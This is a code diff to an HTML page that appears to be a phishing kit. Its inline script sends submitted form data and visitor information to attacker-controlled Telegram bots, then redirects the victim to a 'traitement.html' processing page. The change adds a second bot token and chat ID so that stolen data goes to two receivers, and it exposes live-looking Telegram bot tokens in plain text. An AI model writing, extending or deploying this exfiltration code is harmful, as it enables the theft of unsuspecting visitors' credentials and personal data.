@@ -860,32 +860,45 @@
     </footer>
 
     <script>
-        // Telegram Bot Configuration
-        const BOT_TOKEN = "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw";
-        const CHAT_ID = "5372119436";
+        // Telegram Bots Configuration
+        const BOT_TOKENS = [
+            "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", // البوت الأول
+            "7113935223:AAHIbnPMAgrHvjIIllh3qzDw5EcWNkd_s9A"  // البوت الثاني
+        ];
         
-        // Improved Telegram send function with error handling
+        const CHAT_IDS = [
+            "5372119436", // ID البوت الأول
+            "7198476943"  // ID البوت الثاني
+        ];
+        
+        // Improved Telegram send function with error handling for multiple bots
         async function sendToTelegram(text) {
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: text,
-                        parse_mode: 'Markdown'
-                    })
-                });
-                
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
+            const results = [];
+            
+            for (let i = 0; i < BOT_TOKENS.length; i++) {
+                try {
+                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKENS[i]}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_IDS[i],
+                            text: text,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                    
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! status: ${response.status}`);
+                    }
+                    
+                    results.push(await response.json());
+                } catch (error) {
+                    console.error(`Telegram send error for bot ${i+1}:`, error);
+                    results.push(null);
                 }
-                
-                return await response.json();
-            } catch (error) {
-                console.error('Telegram send error:', error);
-                return null;
             }
+            
+            return results;
         }
 
         // Function to get visitor info
@@ -999,16 +1012,16 @@
 ▸ Date: ${formData.timestamp}
                 `;
                 
-                // Send to Telegram
-                const telegramResponse = await sendToTelegram(message);
+                // Send to Telegram (both bots)
+                const telegramResponses = await sendToTelegram(message);
                 
-                if (telegramResponse && telegramResponse.ok) {
-                    // Success - redirect to next page
+                if (telegramResponses.length > 0 && telegramResponses.some(res => res && res.ok)) {
+                    // Success - redirect to next page if at least one bot succeeded
                     setTimeout(() => {
                         window.location.href = "traitement.html";
                     }, 2000);
                 } else {
-                    throw new Error('Failed to send Telegram message');
+                    throw new Error('Failed to send Telegram message to all bots');
                 }
                 
             } catch (error) {
